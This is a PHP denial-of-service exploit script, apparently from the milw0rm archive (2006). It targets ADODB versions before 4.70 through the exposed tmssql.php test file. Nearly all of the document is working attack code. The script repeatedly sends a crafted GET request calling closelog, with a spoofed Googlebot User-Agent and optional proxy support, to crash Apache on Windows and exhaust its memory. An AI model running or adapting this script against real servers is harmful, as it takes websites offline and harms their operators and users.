<html><head><title>ADODB < 4.70 (tmssql.php) Denial of Service Vulnerability</title></head><pre>#!/usr/bin/php -q -d short_open_tag=on
&lt;?
echo &quot;ADODB tmssql.php Denial of service\r\n&quot;;
echo &quot;by rgod rgod@autistici.org\r\n&quot;;
echo &quot;site: http://retrogod.altervista.org\r\n\r\n&quot;;

if ($argc&lt;4) {
echo &quot;Usage: php &quot;.$argv[0].&quot; host path redo OPTIONS\r\n&quot;;
echo &quot;host:      target server (ip/hostname)\r\n&quot;;
echo &quot;path:      path to ADODB\r\n&quot;;
echo &quot;redo:      how many times?\r\n&quot;;
echo &quot;Options:\r\n&quot;;
echo &quot;   -p[port]:    specify a port other than 80\r\n&quot;;
echo &quot;   -P[ip:port]: specify a proxy\r\n&quot;;
echo &quot;Examples:\r\n&quot;;
echo &quot;php &quot;.$argv[0].&quot; localhost /some_app/ 9999999\r\n&quot;;
echo &quot;php &quot;.$argv[0].&quot; localhost /some_app/ 9999999 -p81\r\n&quot;;
echo &quot;php &quot;.$argv[0].&quot; localhost /some_app/ 9999999 -P1.1.1.1:80\r\n&quot;;
die;
}
/*
  tested against Apache/1.3.27 (Win32) PHP/4.3.3
  
  closelog() func close the connection to the system logger, but if its handle
  is never initialized, Windows exception is raised by the php4ts.dll
  module at address 0x00000000100bf014.
  By sending multiple requests to the tmssql.php script, which allow
  execution of an arbitrary function without arguments, this will cause
  the Apache process to crash and to consume a large amount of memory
*/

error_reporting(0);
ini_set(&quot;max_execution_time&quot;,0);
ini_set(&quot;default_socket_timeout&quot;,5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i&lt;=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) &lt;= 32 ) | (ord($string[$i]) &gt; 126 ))
   {$result.=&quot;  .&quot;;}
   else
   {$result.=&quot;  &quot;.$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=&quot; &quot;.dechex(ord($string[$i]));}
   else
   {$exa.=&quot; 0&quot;.dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.=&quot;\r\n&quot;; $exa.=&quot;\r\n&quot;;}
  }
 return $exa.&quot;\r\n&quot;.$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port.&quot;\r\n&quot;;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo &quot;Connecting to &quot;.$parts[0].&quot;:&quot;.$parts[1].&quot; proxy...\r\n&quot;;
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';
	}
  }
  fputs($ock,$packet);
  fclose($ock);
}

$host=$argv[1];$path=$argv[2];$redo=$argv[3];
$port=80;$proxy=&quot;&quot;;
for ($i=4; $i&lt;=$argc-1; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if ($temp==&quot;-p&quot;)
{
  $port=str_replace(&quot;-p&quot;,&quot;&quot;,$argv[$i]);
}
if ($temp==&quot;-P&quot;)
{
  $proxy=str_replace(&quot;-P&quot;,&quot;&quot;,$argv[$i]);
}
}

if (($path[0]&lt;&gt;'/') or ($path[strlen($path)-1]&lt;&gt;'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

for ($i=1; $i&lt;=$redo; $i++)
{
$packet =&quot;GET &quot;.$p.&quot;include/adodb/tests/tmssql.php?do=closelog HTTP/1.0\r\n&quot;;
$packet.=&quot;User-Agent: Googlebot/2.1\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
sendpacketii($packet);
echo $packet;
}
?&gt;

# milw0rm.com [2006-04-09]</pre></html>